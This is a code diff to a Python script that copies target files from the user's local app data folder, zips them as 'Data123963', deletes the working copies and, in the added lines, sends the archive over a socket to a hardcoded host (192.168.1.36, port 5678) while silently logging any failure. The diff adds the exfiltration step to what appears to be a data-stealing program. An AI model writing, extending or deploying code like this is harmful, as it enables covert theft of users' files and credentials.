@@ -1,5 +1,9 @@
 import os
 import shutil
+import Sockets.sckt_client as client
+import logging
+host = "192.168.1.36"
+port = 5678
 
 def main():
     BasePath = os.getenv('localappdata')
@@ -78,10 +82,14 @@ def main():
             shutil.copy2(TARGET_FILE_PATH[target], COPY_PATH[target])
         except FileNotFoundError:
             pass
-    shutil.make_archive(BasePath + "/Temp/Data123963", "zip", BasePath + "/Temp/Copy/")
+    file = r"C:/Data123963"
+    #file = os.getenv("APPDATA") + r'\..\Local\Temp\Data123963'
+    shutil.make_archive(file, "zip", BasePath + "/Temp/Copy/")
     shutil.rmtree(BasePath + "/Temp/Copy/")
-
-
+    try:
+        client.send_file("C:\Data123963.zip", host, port)
+    except:
+        logging.exception("message")
 
 if __name__ == "__main__":
     main()
